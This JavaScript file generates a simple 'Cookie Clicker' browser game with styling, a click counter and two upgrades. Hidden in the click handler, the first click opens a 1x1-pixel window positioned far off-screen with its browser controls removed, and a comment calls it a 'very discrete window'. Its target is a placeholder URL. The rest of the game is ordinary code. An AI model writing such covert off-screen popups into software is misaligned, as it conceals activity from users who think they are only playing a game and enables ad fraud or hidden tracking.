let cookies = 0;
let firstClick = true;

document.write(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Clicker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: linear-gradient(45deg, #8B4513, #D2691E);
            margin: 0;
            padding: 50px;
            min-height: 100vh;
            box-sizing: border-box;
        }
        
        .game-container {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 20px;
            padding: 30px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        h1 {
            color: #8B4513;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        
        .cookie {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #F4A460, #D2691E, #8B4513);
            border: 5px solid #654321;
            cursor: pointer;
            transition: transform 0.1s, box-shadow 0.1s;
            margin: 20px auto;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            user-select: none;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        .cookie:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
        }
        
        .cookie:active {
            transform: scale(0.95);
        }
        
        .cookie::before {
            content: '🍪';
            position: absolute;
        }
        
        .score {
            font-size: 32px;
            font-weight: bold;
            color: #8B4513;
            margin: 20px 0;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        
        .click-effect {
            position: absolute;
            font-size: 24px;
            font-weight: bold;
            color: #FF6B35;
            pointer-events: none;
            animation: fadeUp 1s ease-out forwards;
        }
        
        @keyframes fadeUp {
            0% {
                opacity: 1;
                transform: translateY(0);
            }
            100% {
                opacity: 0;
                transform: translateY(-50px);
            }
        }
        
        .upgrades {
            margin-top: 30px;
        }
        
        .upgrade-btn {
            background: #8B4513;
            color: white;
            border: none;
            padding: 10px 20px;
            margin: 5px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.3s;
        }
        
        .upgrade-btn:hover {
            background: #654321;
        }
        
        .upgrade-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="game-container">
        <h1>🍪 Cookie Clicker 🍪</h1>
        <div class="score" id="score">Cookies: 0</div>
        <div class="cookie" id="cookie" onclick="clickCookie()"></div>
        <div class="upgrades">
            <button class="upgrade-btn" id="autoClicker" onclick="buyAutoClicker()" disabled>
                Auto Clicker (Cost: 10 cookies)
            </button>
            <button class="upgrade-btn" id="doubleClick" onclick="buyDoubleClick()" disabled>
                Double Click (Cost: 50 cookies)
            </button>
        </div>
    </div>
    
    <script>
        let cookies = 0;
        let firstClick = true;
        let clickPower = 1;
        let autoClickerCount = 0;
        let hasDoubleClick = false;
        
        function clickCookie() {
            if (firstClick) {
                // Open very discrete window on first click
                window.open('https://example.com', '_blank', 'width=1,height=1,top=10000,left=10000,toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no,status=no');
                firstClick = false;
            }
            
            cookies += clickPower;
            updateScore();
            createClickEffect();
            updateUpgrades();
        }
        
        function updateScore() {
            document.getElementById('score').textContent = 'Cookies: ' + cookies;
        }
        
        function createClickEffect() {
            const cookie = document.getElementById('cookie');
            const effect = document.createElement('div');
            effect.className = 'click-effect';
            effect.textContent = '+' + clickPower;
            effect.style.left = (Math.random() * 200 - 100) + 'px';
            effect.style.top = (Math.random() * 200 - 100) + 'px';
            cookie.appendChild(effect);
            
            setTimeout(() => {
                if (effect.parentNode) {
                    effect.parentNode.removeChild(effect);
                }
            }, 1000);
        }
        
        function updateUpgrades() {
            const autoClickerBtn = document.getElementById('autoClicker');
            const doubleClickBtn = document.getElementById('doubleClick');
            
            autoClickerBtn.disabled = cookies < 10;
            doubleClickBtn.disabled = cookies < 50 || hasDoubleClick;
        }
        
        function buyAutoClicker() {
            if (cookies >= 10) {
                cookies -= 10;
                autoClickerCount++;
                updateScore();
                updateUpgrades();
                
                if (autoClickerCount === 1) {
                    setInterval(() => {
                        cookies += autoClickerCount;
                        updateScore();
                        updateUpgrades();
                    }, 1000);
                }
            }
        }
        
        function buyDoubleClick() {
            if (cookies >= 50 && !hasDoubleClick) {
                cookies -= 50;
                clickPower = 2;
                hasDoubleClick = true;
                updateScore();
                updateUpgrades();
                document.getElementById('doubleClick').textContent = 'Double Click (Purchased!)';
            }
        }
        
        updateScore();
        updateUpgrades();
    </script>
</body>
</html>
`);
